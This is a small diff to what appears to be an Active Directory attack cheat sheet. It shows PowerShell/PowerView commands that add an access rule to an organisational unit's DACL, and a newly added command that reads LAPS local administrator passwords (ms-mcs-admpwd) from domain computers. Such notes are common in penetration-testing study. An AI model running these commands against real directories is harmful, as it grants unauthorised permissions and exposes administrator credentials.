@@ -334,11 +334,16 @@ $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity '<USER>' -Righ
 
 #### Apply this ACE to our target OU:
 ```
-$OU = Get-DomainOU -Raw (OU GUID)
+$OU = Get-DomainOU -Raw <OU NAME>
 $DsEntry = $OU.GetDirectoryEntry()
 $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
 $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
 $dsEntry.PsBase.CommitChanges()
+```
+
+#### If laps is enabled, read password
+```
+Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
 ```
 
 ### Writeowner of an object - Change the owner
